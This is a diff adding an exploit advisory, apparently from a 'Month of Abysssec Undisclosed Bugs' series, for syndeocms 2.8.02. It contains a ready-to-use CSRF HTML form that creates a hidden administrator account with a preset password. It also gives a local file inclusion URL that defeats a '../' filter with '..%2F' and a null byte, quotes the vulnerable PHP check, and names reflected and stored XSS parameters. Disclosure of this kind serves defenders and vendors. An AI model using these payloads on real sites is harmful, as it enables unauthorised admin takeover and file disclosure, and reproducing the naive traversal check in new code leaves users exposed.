@@ -1,0 +1,83 @@
+'''
+  __  __  ____         _    _ ____  
+ |  \/  |/ __ \   /\  | |  | |  _ \ 
+ | \  / | |  | | /  \ | |  | | |_) |
+ | |\/| | |  | |/ /\ \| |  | |  _ <  Day 4 (0day)
+ | |  | | |__| / ____ \ |__| | |_) |
+ |_|  |_|\____/_/    \_\____/|____/ 
+
+'''
+ 
+Title  : syndeocms 2.8.02 Multiple Vulnerabilities
+Affected Version : syndeocms <= 2.8.02 
+Vendor  Site   : http://www.syndeocms.org/
+ 
+Discovery : abysssec.com
+  
+ 
+Description :
+ 
+This CMS have many critical vulnerability that we refere to some of those here:
+ 
+ 
+Vulnerabilites :
+
+1. CSRF - Add Admin Account:
+
+<html>
+<body>
+<form onsubmit="return checkinput(this);" action="index.php?option=configuration&suboption=users&modoption=save_user&user_id=0" name="form" method="POST">
+<input class="textfield" type="hidden"  name="fullname" value="csrf"/>
+<input class="textfield" type="hidden"  name="username" value="csrf_admin"/>
+<input class="textfield" type="hidden"  name="password" value="admin123"/>
+<input class="textfield" type="hidden"  name="email" value="csrf@admin.com"/>
+<select name="editor">
+<option value="1" selected="">FCKEditor</option>
+<option value="2">Plain text Editor</option>
+</select>
+<input type="checkbox" checked="" name="initial" value="1"/>
+<input class="textfield" type="hidden" value=""  name="sections"/>
+<input type="radio" name="access_1" value="1"/>
+<input type="radio" name="access_2" value="1"/>
+.
+.
+.
+<input type="radio" name="access_15" value="1"/>
+<input type="radio" name="m_access[0]" value="1"/>
+.
+.
+.
+<input type="radio" name="m_access[21]" value="1"/>
+<input class="savebutton" type="submit" name="savebutton" value="   Save"/>
+</form>
+</body>
+</html>
+-------------------------------------
+2. LFI (Local File Inclusion):
+
+http://localhost/starnet/index.php?option=configuration&suboption=configuration&modoption=edit_css&theme=..%2Findex.php%00
+
+in starnet\core\con_configuration.inc.php file, As you may noticed theme parameter is checked for "../" and could be bypass by with "..%2F":
+line 61-73:
+switch ($modoption) // start of switch
+{
+	case save_css :
+	
+		if (IsSet ($_POST['content']))
+		{
+			$content = $_POST['content'];
+		}
+		
+		if (strpos($theme, "../") === FALSE) //check if someone is trying to fool us.
+		{
+			$filename = "themes/$theme/style.css";
+-------------------------------------
+3. xss:
+in starnet\core\con_alerts.inc.php file "email" parameter when "modoption" is "save_alert":
+http://localhost/starnet/index.php?option=configuration&suboption=alerts&modoption=edit_alert&alert=2
+
+4. stored xss:
+in starnet\core\con_alerts.inc.php file "name" parameter when "modoption" is "save_alert":
+http://localhost/starnet/index.php?option=configuration&suboption=alerts&modoption=edit_alert
+------------------------------
+
